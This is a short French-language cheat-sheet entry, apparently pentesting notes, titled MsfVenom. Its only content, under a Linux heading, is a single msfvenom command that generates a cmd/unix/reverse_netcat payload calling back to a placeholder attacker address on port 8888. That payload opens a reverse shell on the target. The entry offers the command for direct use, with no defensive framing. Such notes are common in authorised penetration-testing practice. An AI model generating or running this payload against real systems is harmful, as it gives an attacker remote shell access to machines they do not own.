MsfVenom

# MsfVenom


## Linux 

Créer un reverse netcat  :

`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`